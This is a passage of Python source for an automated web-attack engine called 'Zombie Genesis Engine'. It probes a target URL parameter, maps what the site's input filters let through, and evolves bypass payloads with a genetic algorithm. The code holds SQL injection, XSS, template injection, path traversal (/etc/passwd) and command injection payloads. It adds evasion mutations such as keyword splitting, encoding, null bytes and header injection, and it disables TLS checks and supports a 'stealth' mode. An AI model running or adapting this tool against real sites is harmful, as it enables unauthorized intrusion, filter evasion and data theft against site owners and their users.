    def __init__(
        self,
        zombie_instance: Optional[Zombie] = None,
        population_size: int = 30,
        max_generations: int = 50,
        elite_ratio: float = 0.2,
        mutation_rate: float = 0.3,
        crossover_rate: float = 0.7,
    ):
        """
        Initialize Zombie Genesis Engine v50.
        
        Args:
            zombie_instance: Optional Zombie instance for stealth
            population_size: Genetic algorithm population size
            max_generations: Maximum evolution generations
            elite_ratio: Ratio of elite individuals to keep
            mutation_rate: Base mutation rate
            crossover_rate: Crossover probability
        """
        self.zombie = zombie_instance
        self.population_size = population_size
        self.max_generations = max_generations
        self.elite_ratio = elite_ratio
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        
        # DNA memory for cross-target learning
        self.dna_memory: Dict[str, Any] = {}
        self.successful_dna: List[Dict] = []
        
        # Genetic fuzzer
        self.genetic_fuzzer = GeneticFuzzer(
            population_size=population_size,
            elite_ratio=elite_ratio,
        )
        
        # Initialize 18+ mutation operators
        self._init_mutations()
        
        # Stats
        self.stats = Counter()
    
    def _init_mutations(self) -> None:
        """Initialize all 18+ mutation operators."""
        self.MUTATION_OPERATORS = {
            MutationType.CHARACTER_SWAP: self._mutate_char_swap,
            MutationType.CASE_FLIP: self._mutate_case_flip,
            MutationType.ENCODING_SHIFT: self._mutate_encoding_shift,
            MutationType.KEYWORD_SPLIT: self._mutate_keyword_split,
            MutationType.COMMENT_INJECT: self._mutate_comment_inject,
            MutationType.WHITESPACE_VARY: self._mutate_whitespace_vary,
            MutationType.SYNTAX_VARIANT: self._mutate_syntax_variant,
            MutationType.LENGTH_GROW: self._mutate_length_grow,
            MutationType.PREFIX_PROBE: self._mutate_prefix_probe,
            MutationType.SUFFIX_PROBE: self._mutate_suffix_probe,
            MutationType.NULL_BYTE_INJECT: self._mutate_null_byte,
            MutationType.BOOLEAN_FLIP: self._mutate_boolean_flip,
            MutationType.CHAIN_OPERATOR: self._mutate_chain_operator,
            MutationType.PROTOCOL_SWITCH: self._mutate_protocol_switch,
            MutationType.HEADER_INJECT: self._mutate_header_inject,
            MutationType.BOUNDARY_MUTATION: self._mutate_boundary,
        }
    
    # ═══ PHASE 1: OBSERVE — Build Multi-Point Baseline ═══
    
    async def observe_target(
        self, url: str, param: str, session
    ) -> Dict:
        """
        PHASE 1: OBSERVE — Build comprehensive baseline from normal inputs.
        
        Args:
            url: Target URL
            param: Parameter name
            session: aiohttp session
            
        Returns:
            TargetDNA dict with baseline data
        """
        dna = {
            "url": url,
            "domain": urlparse(url).netloc,
            "param": param,
            "baseline_responses": {},
            "input_reflection": {},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        
        # Test with multiple normal inputs
        normal_inputs = [
            "test", "1", "hello", "abc123", "normal_value",
            "", "a", "123", "test123", "hello_world",
        ]
        
        for normal in normal_inputs:
            response = await self._send_request(url, param, normal, session)
            dna["baseline_responses"][normal] = {
                "body": response.get("body", "")[:5000],
                "status": response.get("status", 0),
                "length": len(response.get("body", "")),
                "time_ms": response.get("time_ms", 0),
                "headers": response.get("headers", {}),
            }
        
        # Calculate statistical baseline
        lengths = [r["length"] for r in dna["baseline_responses"].values()]
        times = [r["time_ms"] for r in dna["baseline_responses"].values()]
        
        dna["input_reflection"] = {
            "average_length": sum(lengths) / len(lengths) if lengths else 0,
            "stddev_length": statistics.stdev(lengths) if len(lengths) > 1 else 0,
            "min_length": min(lengths) if lengths else 0,
            "max_length": max(lengths) if lengths else 0,
            "average_time_ms": sum(times) / len(times) if times else 0,
            "stddev_time": statistics.stdev(times) if len(times) > 1 else 0,
        }
        
        print(f"  {C.CYAN}[PHASE 1] OBSERVE — {len(normal_inputs)} baselines established{C.RST}")
        print(f"  {C.DIM}Length: {dna['input_reflection']['average_length']:.0f}±{dna['input_reflection']['stddev_length']:.0f}{C.RST}")
        
        return dna
    
    # ═══ PHASE 2: PROBE — Map Filter Behavior ═══
    
    async def probe_target(
        self, url: str, param: str, dna: Dict, session
    ) -> Dict:
        """
        PHASE 2: PROBE — Map complete filter behavior with 50+ probes.
        
        Args:
            url: Target URL
            param: Parameter name
            dna: TargetDNA from Phase 1
            session: aiohttp session
            
        Returns:
            Updated TargetDNA with filter behavior
        """
        all_probes = (
            self.PROBE_CHARACTERS +
            self.SQL_PROBES +
            self.XSS_PROBES +
            self.TEMPLATE_PROBES +
            self.PATH_TRAVERSAL_PROBES
        )
        
        filter_map = {
            "passed": [],
            "escaped": [],
            "removed": [],
            "blocked": [],
            "truncated": [],
            "encoded": [],
        }
        
        avg_length = dna["input_reflection"]["average_length"]
        std_length = dna["input_reflection"]["stddev_length"]
        
        for probe in all_probes:
            response = await self._send_request(url, param, probe, session)
            body = response.get("body", "")
            status = response.get("status", 0)
            
            analysis = self._analyze_probe_result(
                probe, body, status, dna, avg_length, std_length,
                response.get("length", 0)
            )
            filter_map[analysis].append(probe)
        
        dna["filter_behavior"] = {
            "total_probes": len(all_probes),
            "passed_count": len(filter_map["passed"]),
            "escaped_count": len(filter_map["escaped"]),
            "removed_count": len(filter_map["removed"]),
            "blocked_count": len(filter_map["blocked"]),
            "truncated_count": len(filter_map["truncated"]),
            "encoded_count": len(filter_map["encoded"]),
            "filter_map": filter_map,
        }
        
        pass_rate = len(filter_map["passed"]) / max(len(all_probes), 1)
        dna["vulnerable_params"] = {
            param: {
                "pass_rate": pass_rate,
                "likely_vulnerable": pass_rate > 0.3,
                "strict_filter": pass_rate < 0.1,
            }
        }
        
        print(f"  {C.CYAN}[PHASE 2] PROBE — {len(all_probes)} probes, {len(filter_map['passed'])} passed, {len(filter_map['blocked'])} blocked{C.RST}")
        
        return dna
    
    # ═══ PHASE 3: MUTATE — Genetic Algorithm Evolution ═══
    
    async def evolve_payloads(
        self,
        url: str,
        param: str,
        dna: Dict,
        vuln_type: str,
        session,
        max_generations: int = 30,
    ) -> List[Dict]:
        """
        PHASE 3: MUTATE — Genetic algorithm payload evolution.
        
        Args:
            url: Target URL
            param: Parameter name
            dna: TargetDNA
            vuln_type: Vulnerability type
            session: aiohttp session
            max_generations: Maximum generations
            
        Returns:
            List of evolved payloads
        """
        seed_chars = dna["filter_behavior"]["filter_map"]["passed"]
        seed_keywords = [
            p for p in seed_chars
            if len(p) > 1 and not p.startswith("'")
        ]
        
        if not seed_chars and not seed_keywords:
            print(f"  {C.YELLOW}[PHASE 3] No seed chars — falling back to encoding bypass{C.RST}")
            return await self._encoding_bypass_attack(url, param, dna, session)
        
        # Seed population
        population = self._seed_population(seed_chars, seed_keywords, vuln_type)
        best_fitness = 0.0
        stagnation = 0
        
        for generation in range(max_generations):
            dna["generation"] = generation
            
            # Evaluate fitness
            for individual in population:
                fitness = await self._evaluate_fitness(
                    url, param, individual["payload"], dna, session
                )
                individual["fitness"] = fitness
            
            # Sort by fitness
            population.sort(key=lambda x: x["fitness"], reverse=True)
            
            # Track best
            if population[0]["fitness"] > best_fitness:
                best_fitness = population[0]["fitness"]
                stagnation = 0
                dna.setdefault("successful_mutations", []).append({
                    "generation": generation,
                    "payload": population[0]["payload"],
                    "fitness": best_fitness,
                })
            else:
                stagnation += 1
            
            # Convergence check
            if best_fitness > 0.95 or stagnation > 8:
                print(f"  {C.GREEN}[PHASE 3] Converged at generation {generation} (fitness={best_fitness:.3f}){C.RST}")
                break
            
            # Create new population
            new_population = population[:self.genetic_fuzzer.elite_count]
            
            while len(new_population) < self.population_size:
                # Tournament selection
                parent1 = self._tournament_select(population)
                parent2 = self._tournament_select(population)
                
                # Crossover
                if random.random() < self.crossover_rate:
                    child_payload = self._crossover(
                        parent1["payload"], parent2["payload"]
                    )
                else:
                    child_payload = parent1["payload"]
                
                # Mutation (adaptive rate)
                adaptive_rate = self.mutation_rate + (stagnation * 0.05)
                if random.random() < min(adaptive_rate, 0.8):
                    child_payload = self._apply_mutation(
                        child_payload, dna, vuln_type
                    )
                
                new_population.append({
                    "payload": child_payload,
                    "fitness": 0.0,
                    "generation": generation,
                })
            
            population = new_population
        
        # Return successful payloads
        return [
            {
                "payload": p["payload"],
                "fitness": p["fitness"],
                "vuln_type": vuln_type,
                "generation": p.get("generation", 0),
            }
            for p in population
            if p["fitness"] > 0.3
        ]
    
    # ═══ PHASE 6: REMEMBER — Store DNA for Cross-Target Learning ═══
    
    def remember_target(self, dna: Dict) -> None:
        """
        PHASE 6: REMEMBER — Store DNA signature for future targets.
        
        Args:
            dna: TargetDNA dict
        """
        # Create compact DNA signature
        signature_parts = [
            str(dna.get("filter_behavior", {}).get("passed_count", 0)),
            str(dna.get("filter_behavior", {}).get("removed_count", 0)),
            str(dna.get("filter_behavior", {}).get("blocked_count", 0)),
        ]
        dna["dna_signature"] = dhash("|".join(signature_parts), 16)
        
        # Store in memory
        self.dna_memory[dna["dna_signature"]] = {
            "signature": dna["dna_signature"],
            "domain": dna.get("domain", ""),
            "filter_behavior": dna.get("filter_behavior", {}),
            "successful_mutations": dna.get("successful_mutations", []),
            "timestamp": dna.get("timestamp", ""),
        }
        
        # Store successful payloads for cross-target
        for mutation in dna.get("successful_mutations", []):
            self.successful_dna.append({
                "payload": mutation["payload"],
                "fitness": mutation["fitness"],
                "dna_signature": dna["dna_signature"],
            })
        
        print(f"  {C.CYAN}[PHASE 6] REMEMBER — DNA Signature: {dna['dna_signature']}{C.RST}")
        print(f"  {C.DIM}Memory size: {len(self.dna_memory)} targets, {len(self.successful_dna)} payloads{C.RST}")
    
    def get_similar_dna(self, target_dna: Dict, threshold: float = 0.5) -> List[Dict]:
        """
        Find similar DNA signatures from memory for cross-target application.
        
        Args:
            target_dna: Current target DNA
            threshold: Similarity threshold
            
        Returns:
            List of similar DNA entries
        """
        similar = []
        
        target_passed = target_dna.get("filter_behavior", {}).get("passed_count", 0)
        target_blocked = target_dna.get("filter_behavior", {}).get("blocked_count", 0)
        
        for sig, entry in self.dna_memory.items():
            entry_passed = entry.get("filter_behavior", {}).get("passed_count", 0)
            entry_blocked = entry.get("filter_behavior", {}).get("blocked_count", 0)
            
            # Calculate similarity
            passed_sim = 1 - abs(target_passed - entry_passed) / max(target_passed, entry_passed, 1)
            blocked_sim = 1 - abs(target_blocked - entry_blocked) / max(target_blocked, entry_blocked, 1)
            
            similarity = (passed_sim + blocked_sim) / 2
            
            if similarity >= threshold:
                similar.append({
                    "dna_signature": sig,
                    "similarity": similarity,
                    "entry": entry,
                })
        
        similar.sort(key=lambda x: x["similarity"], reverse=True)
        return similar
    
    # ═══ MUTATION OPERATORS (18+) ═══
    
    def _mutate_char_swap(self, p: str, dna: Dict) -> str:
        swaps = [("'", '"'), ("(", ")"), ("<", ">"), ("[", "]"), ("{", "}"), (";", "|")]
        for a, b in swaps:
            if a in p:
                return p.replace(a, b)
        return p + "'"
    
    def _mutate_case_flip(self, p: str, dna: Dict) -> str:
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "SCRIPT", "ALERT", "SLEEP"]
        for kw in keywords:
            if kw in p.upper():
                flipped = "".join(random.choice([c.upper(), c.lower()]) for c in kw)
                return p.replace(kw, flipped)
        return p.swapcase()
    
    def _mutate_encoding_shift(self, p: str, dna: Dict) -> str:
        encodings = [
            lambda s: quote(s, safe=""),
            lambda s: quote(quote(s, safe=""), safe=""),
            lambda s: "".join(f"%{ord(c):02x}" for c in s),
            lambda s: base64.b64encode(s.encode()).decode(),
        ]
        return random.choice(encodings)(p)
    
    def _mutate_keyword_split(self, p: str, dna: Dict) -> str:
        for kw in ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "SCRIPT", "ALERT", "SLEEP"]:
            pattern = re.compile(kw, re.IGNORECASE)
            if pattern.search(p):
                mid = len(kw) // 2
                return pattern.sub(f"{kw[:mid]}/**/{kw[mid:]}", p)
        return p.replace(" ", "/**/")
    
    def _mutate_comment_inject(self, p: str, dna: Dict) -> str:
        comments = ["/**/", "/**//**/", "/*!50000", "/**/--/**/"]
        positions = [i for i, c in enumerate(p) if c in (" ", "'", '"')]
        if positions:
            pos = random.choice(positions)
            return p[:pos] + random.choice(comments) + p[pos:]
        return p
    
    def _mutate_whitespace_vary(self, p: str, dna: Dict) -> str:
        alternatives = ["\t", "\n", "%09", "%0a", "%0d", "%00", "/**/", "%20", "+"]
        return p.replace(" ", random.choice(alternatives))
    
    def _mutate_syntax_variant(self, p: str, dna: Dict) -> str:
        variants = {
            "OR 1=1": ["|| 1=1", "OR '1'='1'", "OR true", "OR 1", "OR true--"],
            "AND 1=1": ["&& 1=1", "AND '1'='1'", "AND true", "AND 1"],
        }
        for original, alternatives in variants.items():
            if original in p.upper():
                return p.replace(original, random.choice(alternatives))
        return p
    
    def _mutate_length_grow(self, p: str, dna: Dict) -> str:
        padding = [
            " AND 'padding'='padding",
            "/**/" * random.randint(1, 5),
            " OR 'x'='x" * random.randint(1, 3),
        ]
        return p + random.choice(padding)
    
    def _mutate_prefix_probe(self, p: str, dna: Dict) -> str:
        prefixes = ["'", '"', "')", '")', "';", '";', "')--", "\\'", "%27"]
        return random.choice(prefixes) + p
    
    def _mutate_suffix_probe(self, p: str, dna: Dict) -> str:
        suffixes = ["--", "#", "/*", ";--", "';--", "')--", "-- -", "--+"]
        return p + random.choice(suffixes)
    
    def _mutate_null_byte(self, p: str, dna: Dict) -> str:
        positions = [i for i in range(len(p)) if p[i] in (" ", "'", ";")]
        if positions:
            pos = random.choice(positions)
            return p[:pos] + "%00" + p[pos:]
        return p + "%00"
    
    def _mutate_boolean_flip(self, p: str, dna: Dict) -> str:
        flips = {"OR": "AND", "AND": "OR", "1=1": "1=2", "1=2": "1=1", "true": "false", "false": "true"}
        for original, replacement in flips.items():
            if original in p.upper():
                return p.replace(original, replacement)
        return p
    
    def _mutate_chain_operator(self, p: str, dna: Dict) -> str:
        operators = [";", "|", "||", "&&", "\n", "%0a", "%0d%0a", ";%00"]
        if ";" in p:
            return p.replace(";", random.choice(operators))
        return p + random.choice(operators)
    
    def _mutate_protocol_switch(self, p: str, dna: Dict) -> str:
        if p.startswith("http://"):
            return p.replace("http://", "https://")
        elif p.startswith("https://"):
            return p.replace("https://", "http://")
        return p
    
    def _mutate_header_inject(self, p: str, dna: Dict) -> str:
        headers = [
            "\nX-Forwarded-For: 127.0.0.1",
            "\nX-Forwarded-Host: localhost",
            "\nX-Real-IP: 127.0.0.1",
        ]
        return p + random.choice(headers)
    
    def _mutate_boundary(self, p: str, dna: Dict) -> str:
        boundaries = ["--boundary", "--form-boundary", "--random-boundary"]
        return f"{random.choice(boundaries)}\nContent-Disposition: form-data; name=\"file\"; filename=\"{p}\"\n\n{p}"
    
    # ═══ HELPERS ═══
    
    def _crossover(self, parent1: str, parent2: str) -> str:
        if len(parent1) < 2 or len(parent2) < 2:
            return parent1 + parent2
        mid1 = random.randint(1, len(parent1) - 1)
        mid2 = random.randint(1, len(parent2) - 1)
        return parent1[:mid1] + parent2[mid2:]
    
    def _tournament_select(self, population: List[Dict], tournament_size: int = 3) -> Dict:
        tournament = random.sample(population, min(tournament_size, len(population)))
        return max(tournament, key=lambda x: x.get("fitness", 0))
    
    def _apply_mutation(self, payload: str, dna: Dict, vuln_type: str) -> str:
        available_mutations = list(self.MUTATION_OPERATORS.keys())
        mutation_type = random.choice(available_mutations)
        operator = self.MUTATION_OPERATORS[mutation_type]
        try:
            return operator(payload, dna)
        except Exception:
            return payload
    
    async def _send_request(self, url: str, param: str, value: str, session) -> Dict:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [value]
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            start = time.time()
            headers = {}
            if self.zombie:
                headers = self.zombie.get_headers(test_url)
            
            async with session.get(
                test_url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15),
                ssl=False,
            ) as resp:
                body = await resp.text()
                elapsed = (time.time() - start) * 1000
                return {
                    "body": body,
                    "status": resp.status,
                    "time_ms": elapsed,
                    "length": len(body),
                    "headers": dict(resp.headers),
                }
        except Exception as e:
            return {"body": "", "status": 0, "time_ms": 0, "length": 0, "error": str(e)}
    
    def _analyze_probe_result(
        self, probe: str, body: str, status: int, dna: Dict,
        avg_length: float, std_length: float, response_length: int,
    ) -> str:
        if status in [403, 406, 429]:
            return "blocked"
        
        if probe not in body:
            if probe == "<" and "&lt;" in body:
                return "escaped"
            if probe == ">" and "&gt;" in body:
                return "escaped"
            if probe == '"' and "&quot;" in body:
                return "escaped"
            if probe in ("'", '"') and f"\\{probe}" in body:
                return "escaped"
            if quote(probe) in body and probe not in body:
                return "encoded"
            return "removed"
        
        if response_length < avg_length - 2 * std_length:
            return "truncated"
        
        return "passed"
    
    def _seed_population(
        self, chars: List[str], keywords: List[str], vuln_type: str
    ) -> List[Dict]:
        population = []
        templates = {
            "sqli": [
                "{char} OR 1=1--",
                "{char} AND 1=1--",
                "{char} UNION SELECT 1--",
                "{char} OR '1'='1",
                "' OR {keyword}--",
            ],
            "xss": [
                "{char}<script>alert(1)</script>",
                "{char}<img src=x onerror=alert(1)>",
                "{char}<svg onload=alert(1)>",
                '"{char} onmouseover=alert(1) x="',
            ],
            "ssti": [
                "{char}{{7*7}}",
                "{char}${7*7}",
                "{char}#{7*7}",
                "{char}<%= 7*7 %>",
            ],
            "lfi": [
                "{char}../../../etc/passwd",
                "{char}..\\..\\..\\windows\\win.ini",
                "{char}....//....//....//etc/passwd",
            ],
            "cmdi": [
                "{char}; id",
                "{char}| id",
                "{char}&& id",
                "{char}`id`",
                "{char}$(id)",
            ],
        }
        
        for template in templates.get(vuln_type, ["{char}"]):
            for char in chars[:10]:
                payload = template.format(char=char, keyword=random.choice(keywords) if keywords else "test")
                population.append({
                    "payload": payload,
                    "fitness": 0.0,
                    "generation": 0,
                })
        
        # Fill remaining slots
        while len(population) < self.population_size:
            if chars and keywords:
                payload = random.choice(chars) + random.choice(keywords)
            elif chars:
                payload = random.choice(chars) * 3
            else:
                payload = "test"
            population.append({
                "payload": payload,
                "fitness": 0.0,
                "generation": 0,
            })
        
        return population[:self.population_size]
    
    async def _evaluate_fitness(
        self, url: str, param: str, payload: str, dna: Dict, session
    ) -> float:
        response = await self._send_request(url, param, payload, session)
        
        scores = []
        baseline_len = dna["input_reflection"].get("average_length", 0)
        current_len = response.get("length", 0)
        baseline_time = dna["input_reflection"].get("average_time_ms", 0)
        current_time = response.get("time_ms", 0)
        
        # Length deviation
        if baseline_len > 0:
            length_dev = abs(current_len - baseline_len) / max(baseline_len, 1)
            scores.append(min(length_dev * 3, 1.0))
        
        # Status code anomaly
        if response.get("status", 200) >= 500:
            scores.append(0.8)
        elif response.get("status", 200) >= 400:
            scores.append(0.4)
        
        # Error patterns
        error_patterns = [
            "error", "warning", "exception", "syntax", "sql",
            "mysql", "postgresql", "oracle", "mssql", "sqlite",
            "traceback", "stack trace", "fatal",
        ]
        body_lower = response.get("body", "").lower()
        error_matches = sum(1 for p in error_patterns if p in body_lower)
        if error_matches > 0:
            scores.append(min(error_matches * 0.15, 1.0))
        
        # Time-based anomaly
        if baseline_time > 0 and current_time > baseline_time * 3:
            scores.append(0.7)
        
        # Payload reflection
        if payload in response.get("body", ""):
            scores.append(0.3)
        
        if not scores:
            return 0.0
        
        return round(sum(scores) / len(scores), 4)
    
    async def _encoding_bypass_attack(
        self, url: str, param: str, dna: Dict, session
    ) -> List[Dict]:
        """Fallback: encoding bypass when all characters are blocked."""
        payloads = []
        base_payloads = [
            ("' OR 1=1--", "sqli"),
            ("<script>alert(1)</script>", "xss"),
            ("{{7*7}}", "ssti"),
            ("../../../etc/passwd", "lfi"),
            ("; id", "cmdi"),
        ]
        
        for base, vtype in base_payloads:
            for encoding in ["url", "double_url", "hex", "base64"]:
                encoded = self._apply_encoding(base, encoding)
                response = await self._send_request(url, param, encoded, session)
                fitness = await self._evaluate_fitness(url, param, encoded, dna, session)
                if fitness > 0.3:
                    payloads.append({
                        "payload": encoded,
                        "fitness": fitness,
                        "vuln_type": vtype,
                        "encoding": encoding,
                    })
        
        return payloads
    
    def _apply_encoding(self, payload: str, encoding: str) -> str:
        if encoding == "url":
            return quote(payload, safe="")
        elif encoding == "double_url":
            return quote(quote(payload, safe=""), safe="")
        elif encoding == "hex":
            return "0x" + payload.encode().hex()
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        return payload
    
    def get_stats(self) -> Dict:
        """Return genesis engine statistics."""
        return {
            "dna_targets": len(self.dna_memory),
            "successful_payloads": len(self.successful_dna),
            "mutation_operators": len(self.MUTATION_OPERATORS),
            "population_size": self.population_size,
            "max_generations": self.max_generations,
            "mutation_rate": self.mutation_rate,
            "crossover_rate": self.crossover_rate,
        }


